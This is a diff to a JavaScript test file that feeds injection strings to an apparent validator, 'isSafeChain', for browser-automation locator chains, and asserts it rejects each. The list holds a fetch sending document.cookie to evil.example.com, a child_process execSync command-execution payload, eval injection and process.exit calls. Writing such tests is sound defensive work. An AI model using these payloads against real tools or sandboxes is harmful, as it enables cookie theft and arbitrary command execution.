@@ -11,6 +11,9 @@ const bypasses = [
   "evaluate(() => fetch('http://evil.example.com', { method: 'POST', body: document.cookie }))",
   "locator('x'); process.exit(1)",
   "constructor.constructor('return process')().exit()",
+  "locator(global.process.mainModule.require('child_process').execSync('id').toString())",
+  "getByRole('button', { name: eval('1+1') })",
+  "locator(process.exit())",
 ];
 for (const p of bypasses) {
   assert.strictEqual(isSafeChain(p), null, `FAIL: bypass accepted: ${p}`);
